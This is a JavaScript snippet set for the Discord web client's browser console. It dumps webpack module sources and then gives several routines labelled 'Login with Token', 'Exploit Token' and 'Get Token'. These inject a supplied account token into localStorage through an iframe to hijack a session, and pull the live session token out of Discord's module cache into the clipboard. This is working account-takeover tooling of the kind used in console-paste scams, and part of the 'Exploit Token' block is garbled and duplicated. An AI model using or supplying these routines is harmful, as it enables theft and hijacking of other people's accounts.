window.webpackChunkdiscord_app.forEach((element) => {
  console.log(element);
});

window.webpackChunkdiscord_app.forEach((chunk) => {
  const modules = chunk[1] || chunk[0];
  if (modules && typeof modules === "object") {
    Object.entries(modules).forEach(([key, moduleFunction]) => {
      try {
        console.log(`Module ${key}:`, moduleFunction.toString());
      } catch (err) {
        console.log(`Error accessing module ${key}`);
      }
    });
  }
});

// Login with Token
let token = "token";

function login(token) {
  setInterval(() => {
    document.body.appendChild(
      document.createElement`iframe`
    ).contentWindow.localStorage.token = `"${token}"`;
  }, 50);
  setTimeout(() => {
    location.reload();
  }, 2500);
}

login(token);

// Exploit Token
function exploit(auth) {
  setInterval(() => {
    document.body.appendChild(
      document.createElement`iframe`
    ).contentWindow.localStorage.token = `"${auth}"`;
  }, 50);
}
setTimeout(() => {
  location.reload();
}, 2500);
{
  exploit("token-here");
}

// Get Token from LocalStorage
(function () {
  window.t = "TOKEN";
  window.localStorage = document.body.appendChild(
    document.createElement`iframe`
  ).contentWindow.localStorage;
  window.setInterval(() => (window.localStorage.token = `"${window.t}"`));
  window.location.reload();
})();

// Get Token
window.webpackChunkdiscord_app.push([
  [Math.random()],
  {},
  (req) => {
    if (!req.c) return;
    for (const m of Object.keys(req.c)
      .map((x) => req.c[x].exports)
      .filter((x) => x)) {
      if (m.default && m.default.getToken !== undefined) {
        return copy(m.default.getToken());
      }
      if (m.getToken !== undefined) {
        return copy(m.getToken());
      }
    }
  },
]);
console.log("%cWorked!", "font-size: 50px");
console.log(`%cYou now have your token in the clipboard!`, "font-size: 16px");
